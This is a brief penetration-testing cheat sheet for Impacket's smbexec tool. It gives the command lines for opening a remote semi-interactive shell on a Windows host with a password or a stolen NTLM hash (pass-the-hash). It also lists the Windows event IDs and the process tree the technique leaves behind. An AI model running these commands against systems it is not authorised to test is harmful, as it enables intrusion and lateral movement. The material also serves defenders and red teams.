### Source
https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py  

### Get semi interactive powershell
```
impacket-smbexec <domain>/<user>:<password>@<rhost>
```

### Using hash
```
impacket-smbexec -hashes :<ntlmHash> <domain>/<user>@<rhost>
```
 
### Opsec considerations
```
Windows Security Log Event IDs
-Logon (4624)
-Special Logon (4672)

Windows System Logs
-Service Control Manager (7045)
```

### Running processes
```
cmd.exe
└── cmd.exe
    └── Conhost.exe
```

